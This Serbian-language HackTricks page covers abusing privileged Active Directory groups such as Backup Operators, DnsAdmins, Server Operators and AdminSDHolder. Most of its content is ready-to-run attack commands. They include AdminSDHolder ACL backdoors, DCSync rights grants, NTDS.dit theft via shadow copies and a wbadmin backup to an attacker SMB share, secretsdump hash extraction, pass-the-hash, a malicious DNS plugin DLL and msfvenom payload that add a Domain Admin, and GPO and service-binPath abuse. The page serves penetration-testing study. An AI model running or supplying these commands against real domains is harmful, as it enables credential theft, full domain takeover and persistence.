# Privileged Groups

{{#include ../../banners/hacktricks-training.md}}

## Dobro poznate grupe sa administrativnim privilegijama

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Ova grupa ima ovlašćenje da kreira naloge i grupe koje nemaju administratorske privilegije na domenu. Takođe omogućava lokalno prijavljivanje na Domain Controller (DC).

Da bi se identifikovali članovi ove grupe, izvršava se sledeća komanda:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Dodavanje novih korisnika je dozvoljeno, kao i lokalno prijavljivanje na DC.<sup>[[1]](#references)</sup>

## AdminSDHolder grupa

Access Control List (ACL) grupe **AdminSDHolder** je ključna jer postavlja dozvole za sve „zaštićene grupe“ u okviru Active Directory-ja, uključujući grupe sa visokim privilegijama. Ovaj mehanizam obezbeđuje sigurnost ovih grupa sprečavanjem neovlašćenih izmena.

Napadač bi ovo mogao da iskoristi izmenom ACL-a grupe **AdminSDHolder** i dodeljivanjem potpunih dozvola standardnom korisniku. To bi tom korisniku efektivno dalo potpunu kontrolu nad svim zaštićenim grupama. Ako se dozvole ovog korisnika izmene ili uklone, one bi automatski bile vraćene u roku od sat vremena zbog načina na koji je sistem dizajniran.<sup>[[14]](#references)</sup>

Nedavna dokumentacija za Windows Server i dalje tretira nekoliko ugrađenih operator grupa kao **zaštićene** objekte (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, itd.). Proces **SDProp** se podrazumevano pokreće na **PDC Emulator** računaru svakih 60 minuta, postavlja `adminCount=1` i onemogućava nasleđivanje na zaštićenim objektima. Ovo je korisno i za persistence i za pronalaženje zastarelih privilegovanih korisnika koji su uklonjeni iz zaštićene grupe, ali i dalje zadržavaju ACL bez nasleđivanja.<sup>[[12]](#references)</sup>

Komande za pregled članova i izmenu dozvola uključuju:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Dostupna je skripta za ubrzavanje procesa obnavljanja: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Za više detalja posetite [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## AD Recycle Bin

Članstvo u ovoj grupi omogućava čitanje obrisanih Active Directory objekata, što može otkriti osetljive informacije:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Ovo je korisno za **rekonstrukciju prethodnih puteva privilegija**. Obrisani objekti i dalje mogu otkriti `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, stare SPN-ove ili DN obrisane privilegovane grupe koju drugi operator kasnije može vratiti.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Pristup kontroleru domena

Pristup datotekama na DC-u je ograničen, osim ako korisnik nije član grupe `Server Operators`, što menja nivo pristupa.

### Eskalacija privilegija

Korišćenjem alata `PsService` ili `sc` iz Sysinternals-a, moguće je pregledati i izmeniti dozvole servisa. Grupa `Server Operators`, na primer, ima potpunu kontrolu nad određenim servisima, što omogućava izvršavanje proizvoljnih komandi i eskalaciju privilegija:<sup>[[1]](#references)</sup>
```cmd
C:\> .\PsService.exe security AppReadiness
```
Ova komanda otkriva da `Server Operators` imaju potpun pristup, što omogućava manipulaciju servisima radi dobijanja povišenih privilegija.

## Backup Operators

Članstvo u grupi `Backup Operators` pruža pristup sistemu datoteka na `DC01` računaru zahvaljujući privilegijama `SeBackup` i `SeRestore`. Ove privilegije omogućavaju prolazak kroz fascikle, izlistavanje i kopiranje datoteka, čak i bez eksplicitnih dozvola, korišćenjem zastavice `FILE_FLAG_BACKUP_SEMANTICS`. Za ovaj proces neophodno je koristiti određene skripte.<sup>[[1]](#references)</sup>

Da biste izlistali članove grupe, izvršite:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Lokalni napad

Za iskorišćavanje ovih privilegija lokalno primenjuju se sledeći koraci:

1. Uvezite neophodne biblioteke:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Omogućite i proverite `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Pristupite i kopirajte datoteke iz ograničenih direktorijuma, na primer:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Direct access to file system Domain Controller-a omogućava krađu baze `NTDS.dit`, koja sadrži sve NTLM hash-eve korisnika i računara domena.

#### Using diskshadow.exe

1. Kreirajte shadow copy `C` diska:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Kopirajte `NTDS.dit` iz shadow copy-ja:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternativno, koristite `robocopy` za kopiranje datoteka:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Izdvojite `SYSTEM` i `SAM` za preuzimanje hash-eva:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Preuzmite sve hash-eve iz `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Nakon ekstrakcije: Pass-the-Hash do DA<sup>[[11]](#references)</sup>
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Korišćenje wbadmin.exe

1. Podesite NTFS filesystem za SMB server na attacker mašini i keširajte SMB credentials na target mašini.
2. Koristite `wbadmin.exe` za system backup i `NTDS.dit` extraction:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Za praktičnu demonstraciju pogledajte [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Članovi **DnsAdmins** grupe mogu da iskoriste svoje privilegije za učitavanje proizvoljnog DLL-a sa SYSTEM privilegijama na DNS serveru, koji se često hostuje na Domain Controllers. Ova mogućnost pruža značajan potencijal za exploitation.

Za izlistavanje članova DnsAdmins grupe koristite:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Izvršavanje proizvoljnog DLL-a (CVE‑2021‑40469)

> [!NOTE]
> Ova ranjivost omogućava izvršavanje proizvoljnog koda sa SYSTEM privilegijama u DNS servisu (obično unutar DC-ova). Ovaj problem je otklonjen 2021. godine.

Članovi mogu naterati DNS server da učita proizvoljni DLL (lokalno ili sa udaljenog share-a) pomoću komandi kao što su:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Ponovno pokretanje DNS servisa (što može zahtevati dodatne dozvole) neophodno je da bi DLL bio učitan:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Za više detalja o ovom attack vectoru pogledajte ired.team.

#### Mimilib.dll

Takođe je moguće koristiti mimilib.dll za izvršavanje komandi, izmeniti ga tako da izvršava određene komande ili reverse shell-ove. [Pogledajte ovu objavu](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) za više informacija.<sup>[[15]](#references)</sup>

### WPAD Record za MitM

DnsAdmins mogu manipulisati DNS zapisima radi izvođenja Man-in-the-Middle (MitM) napada tako što kreiraju WPAD zapis nakon onemogućavanja globalne liste blokiranih upita. Alati kao što su Responder ili Inveigh mogu se koristiti za spoofing i presretanje mrežnog saobraćaja.

### Event Log Readers
Članovi mogu pristupati event logovima i potencijalno pronaći osetljive informacije, kao što su plaintext lozinke ili detalji o izvršavanju komandi:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Ova grupa može da menja DACL-ove na objektu domena, čime potencijalno može da dodeli DCSync privilegije. Tehnike eskalacije privilegija koje iskorišćavaju ovu grupu detaljno su opisane u Exchange-AD-Privesc GitHub repozitorijumu.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Ako možete da delujete kao član ove grupe, klasična zloupotreba je da principalu pod kontrolom napadača dodelite prava replikacije potrebna za [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Istorijski, **PrivExchange** je povezivao pristup mailbox-u, iznuđenu Exchange autentikaciju i LDAP relay kako bi se došlo do istog primitiva. Čak i kada je taj relay put ublažen, direktno članstvo u grupi `Exchange Windows Permissions` ili kontrola nad Exchange serverom i dalje predstavljaju rutu visoke vrednosti do prava replikacije domena.

## Hyper-V Administrators

Hyper-V Administrators imaju potpuni pristup Hyper-V-u, što se može iskoristiti za preuzimanje kontrole nad virtuelizovanim Domain Controller-ima. To uključuje kloniranje aktivnih DC-ova i izdvajanje NTLM hash-eva iz datoteke `NTDS.dit`.

### Primer eksploatacije

Praktična zloupotreba obično podrazumeva **offline pristup diskovima/checkpoint-ima DC-a**, a ne stare host-level LPE trikove. Uz pristup Hyper-V hostu, operater može da napravi checkpoint ili izveze virtuelizovani Domain Controller, mount-uje VHDX i izdvoji `NTDS.dit`, `SYSTEM` i druge secrets bez pristupanja LSASS-u unutar guest-a:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Od tog mesta, ponovo upotrebite `Backup Operators` workflow da biste kopirali `Windows\NTDS\ntds.dit` i registry hive-ove offline. Povezani backup-file workflow:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners

Ova grupa omogućava članovima da kreiraju Group Policies u domenu. Međutim, njeni članovi ne mogu da primene group policies na korisnike ili grupe, niti da uređuju postojeće GPO-ove.

Važna nijansa je da **creator postaje vlasnik novog GPO-a** i obično dobija dovoljno prava da ga naknadno uređuje. To znači da je ova grupa zanimljiva kada možete da:

- kreirate maliciozni GPO i ubedite administratora da ga poveže sa ciljanim OU-om/domenom
- uređujete GPO koji ste kreirali, a koji je već povezan na korisnom mestu
- zloupotrebite drugo delegirano pravo koje vam omogućava da povezujete GPO-ove, dok vam ova grupa daje mogućnost njihovog uređivanja

Praktična abuse obično podrazumeva dodavanje **Immediate Task**-a, **startup script**-a, članstva u **local admin** grupi ili izmene **user rights assignment**-a kroz policy fajlove podržane sistemom SYSVOL.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Ako ručno uređujete GPO putem `SYSVOL`-a, imajte na umu da sama promena nije dovoljna: `versionNumber`, `GPT.ini` i ponekad `gPCMachineExtensionNames` takođe moraju biti ažurirani, u suprotnom će klijenti ignorisati osvežavanje policy-ja.<sup>[[9]](#references)</sup>

## Organization Management

U okruženjima u kojima je implementiran **Microsoft Exchange**, posebna grupa poznata kao **Organization Management** poseduje značajne mogućnosti. Ova grupa ima privilegiju da **pristupa mailbox-ovima svih korisnika domena** i održava **potpunu kontrolu nad** organizacionom jedinicom (OU) **'Microsoft Exchange Security Groups'**. Ova kontrola obuhvata grupu **`Exchange Windows Permissions`**, koja se može iskoristiti za privilege escalation.

### Exploitation privilegija i komande

#### Print Operators

Članovi grupe **Print Operators** imaju nekoliko privilegija, uključujući **`SeLoadDriverPrivilege`**, koja im omogućava da se **lokalno prijave na Domain Controller**, isključe ga i upravljaju štampačima. Za exploitation ovih privilegija, naročito ako **`SeLoadDriverPrivilege`** nije vidljiva u unelevated kontekstu, neophodno je zaobići User Account Control (UAC).<sup>[[1]](#references)</sup>

Za izlistavanje članova ove grupe koristi se sledeća PowerShell komanda:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Na Domain Controllers ova grupa je opasna zato što podrazumevana Domain Controller Policy dodeljuje privilegiju **`SeLoadDriverPrivilege`** grupi `Print Operators`. Ako dođete do povišenog tokena člana ove grupe, možete omogućiti privilegiju i učitati potpisani, ali ranjivi driver kako biste prešli na kernel/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Za detalje o rukovanju tokenima pogledajte [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Članovima ove grupe odobren je pristup računarima putem Remote Desktop Protocol (RDP). Za enumeraciju ovih članova dostupne su PowerShell komande:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Dodatni uvidi u exploitovanje RDP-a mogu se pronaći u namenskim pentesting resursima.

#### Korisnici za udaljeno upravljanje

Članovi mogu da pristupe računarima putem **Windows Remote Management (WinRM)**. Enumeracija ovih članova vrši se pomoću:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Za exploitation tehnike povezane sa **WinRM**, potrebno je konsultovati odgovarajuću dokumentaciju.

#### Server Operators

Ova grupa ima dozvole za obavljanje različitih konfiguracija na Domain Controllers, uključujući privilegije za pravljenje rezervnih kopija i vraćanje podataka, menjanje sistemskog vremena i isključivanje sistema.<sup>[[1]](#references)</sup> Za enumeraciju članova koristi se sledeća komanda:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Na Domain Controllers, `Server Operators` obično nasleđuju dovoljno prava da **ponovo konfigurišu usluge ili ih pokreću/zaustavljaju**, a takođe dobijaju `SeBackupPrivilege`/`SeRestorePrivilege` putem podrazumevane politike DC-a. U praksi, to ih čini vezom između **zloupotrebe kontrole usluga** i **NTDS ekstrakcije**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Ako service ACL ovoj grupi daje prava za izmenu/pokretanje, usmerite service na proizvoljnu komandu, pokrenite ga kao `LocalSystem`, a zatim vratite originalni `binPath`. Ako je kontrola service-a ograničena, koristite navedene `Backup Operators` tehnike kao alternativu za kopiranje `NTDS.dit`.

## References

- [1] [ired.team – Privilegovani nalozi i privilegije tokena](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Zloupotreba SeLoadDriverPrivilege za eskalaciju privilegija](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Zloupotreba GPO dozvola](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – Zloupotreba GPO-a, 1. deo (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – Vodič red team-a za GPO-ove i OU-ove](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – Funkcija ZwLoadDriver](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — Anonimni LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Dodatak C: Zaštićeni nalozi i grupe u Active Directory-ju](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Kako zloupotrebiti i postaviti backdoor na AdminSDHolder radi dobijanja persistence-a za Domain Admin-a](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Zloupotreba DnsAdmins privilegije za eskalaciju u Active Directory-ju](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – Informacije o zloupotrebi GenericAll edge-a](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – Funkcija NtLoadDriver (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
